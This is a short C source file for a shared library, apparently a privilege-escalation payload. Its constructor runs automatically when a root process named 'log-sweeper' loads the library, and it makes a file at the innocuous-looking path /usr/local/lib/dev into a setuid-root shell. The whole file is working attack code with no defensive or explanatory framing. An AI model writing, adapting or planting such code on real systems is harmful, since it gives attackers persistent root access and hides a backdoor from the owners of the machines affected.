#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define ROOTSHELL "/usr/local/lib/dev"

/* Runs automatically when log-sweeper loads this library (as root). */
__attribute__((constructor))
void init(void) {
    chown(ROOTSHELL, 0, 0);       /* set owner/group to root (uid 0, gid 0) */
    chmod(ROOTSHELL, 04755);      /* SUID + rwxr-xr-x */
}
